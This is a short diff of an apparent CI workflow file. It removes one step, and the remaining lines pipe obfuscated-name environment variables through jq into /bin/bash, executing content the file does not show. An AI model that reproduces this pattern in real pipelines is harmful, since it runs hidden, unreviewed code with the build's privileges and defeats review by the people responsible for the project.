@@ -25,7 +25,6 @@ jobs:
           echo $drf41 | jq -r .kdn22 | /bin/bash
           echo $ltcin51500 | jq -r .eij77582 | /bin/bash
           printf '%s' "$v1" | jq -r .kc661 | /bin/bash
-          printf '%s' "$zo43" | jq -r .v8 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
